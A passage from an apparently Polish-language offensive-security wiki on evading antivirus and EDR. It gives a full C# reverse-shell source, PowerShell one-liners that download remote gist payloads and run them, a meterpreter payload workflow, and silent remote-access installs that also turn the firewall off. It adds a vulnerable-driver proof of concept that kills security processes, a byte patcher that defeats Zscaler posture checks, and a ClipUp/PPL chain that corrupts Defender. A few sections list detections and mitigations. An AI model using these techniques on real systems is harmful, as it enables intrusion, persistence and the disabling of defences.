> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować C# Assemblies **from PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korzystanie z innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonanie złośliwego kodu przy użyciu innych języków, dając skompromitowanej maszynie dostęp **to the interpreter environment installed on the Attacker Controlled SMB share**.

Pozwalając na dostęp do Interpreter Binaries i środowiska na udziale SMB można **execute arbitrary code in these languages within memory** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd. mamy **więcej elastyczności w omijaniu statycznych sygnatur**. Testy z losowymi nieobfuskowanymi reverse shell scripts w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access tokenem lub produktem zabezpieczającym takim jak EDR lub AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zostanie zakończony, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Użycie zaufanego oprogramowania

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać MSI.
2. Uruchom instalator w trybie cichym na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij Next. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga: parametr --pin pozwala ustawić PIN bez użycia GUI).


## Zaawansowane unikanie wykrycia

Evasion to bardzo skomplikowany temat; czasami trzeba brać pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby zdobyć podstawy bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części pliku binarnego** aż **dowiedzieć się, którą część Defender** uznaje za złośliwą i rozdzieli ją dla Ciebie.\
Inne narzędzie robiące **to samo** to [**avred**](https://github.com/dobin/avred) z otwartą usługą webową pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 wszystkie Windowsy zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby się **uruchamiał** przy starcie systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebujesz wersji binarnej, nie setupu)

**NA MASZYNIE (HOST)**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować stealth, nie rób kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup]. Sprawdź, czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window]
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywoła to [popup]

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT]
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** poleceniem `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj go z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompilator
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchomienie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć ochronę endpoint przed zrzuceniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *signed* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nawet usługi AV uruchomione jako Protected-Process-Light (PPL) nie mogą zablokować.

Najważniejsze wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to prawidłowo podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” Antiy Labs. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączony.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD całkowicie omija zabezpieczenia w trybie użytkownika; kod wykonujący się w jądrze może otwierać *protected* procesy, kończyć je lub modyfikować obiekty jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów hardeningu.

Detection / Mitigation
•  Włącz listę blokowania podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *kernel* services i generuj alert, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na allow-list.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń i podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** stosuje reguły device-posture lokalnie i używa Windows RPC do komunikowania wyników z innymi komponentami. Dwa słabe decyzje projektowe umożliwiają pełne obejście:

1. Ocena posture odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest tylko boolean).  
2. Wewnętrzne endpointy RPC weryfikują jedynie, że łączący się plik wykonywalny jest **signed by Zscaler** (przez `WinVerifyTrust`).

Poprzez **patchowanie czterech signed binarek na dysku** obie mechaniki można unieszkodliwić:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet unsigned) proces może podpiąć się do RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Skrócone / short-circuited |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po podmianie oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole postawy pokazują **zielone/zgodne**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATRayManager_talk_to_me`).
* Zaatakowany host zyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak decyzje zaufania wykonywane wyłącznie po stronie klienta i proste sprawdzenia sygnatur można obejść za pomocą kilku poprawek bajtowych.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, tak że tylko chronione procesy o równym lub wyższym poziomie mogą na siebie wpływać. W ataku, jeśli potrafisz legalnie uruchomić binarkę z włączonym PPL i kontrolować jej argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logging) w ograniczony prymityw zapisu wspierany przez PPL do chronionych katalogów używanych przez AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` samodzielnie się uruchamia i akceptuje parametr pozwalający zapisać plik logu do ścieżki wskazanej przez wywołującego.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom PPL-capable LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3, jeśli potrzeba.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas bootowania przed uruchomieniem AV instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (boot logging).
4) Po restarcie zapis z poparciem PPL następuje zanim AV zablokuje swoje binaria, co powoduje uszkodzenie pliku docelowego i uniemożliwia uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie można kontrolować zawartości, które ClipUp zapisuje, poza miejscem ich umieszczenia; prymityw nadaje się do korupcji danych, a nie do precyzyjnego wstrzykiwania treści.
- Wymaga uprawnień lokalnego admina/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na restart.
- Synchronizacja jest krytyczna: cel nie może być otwarty; wykonanie podczas rozruchu systemu unika blokad plików.

Wykrycia
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza uruchamianego przez niestandardowe launchery, w okolicach rozruchu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów uruchamiania Defendera.
- Monitorowanie integralności plików w katalogach binarek/Platform Defendera; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- ETW/EDR telemetry: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomów PPL przez binarki niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi rodzicami; zablokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością startu.
- Upewnij się, że Defender tamper protection i zabezpieczenia wczesnego uruchamiania są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania nazw 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli jest to zgodne z twoim środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
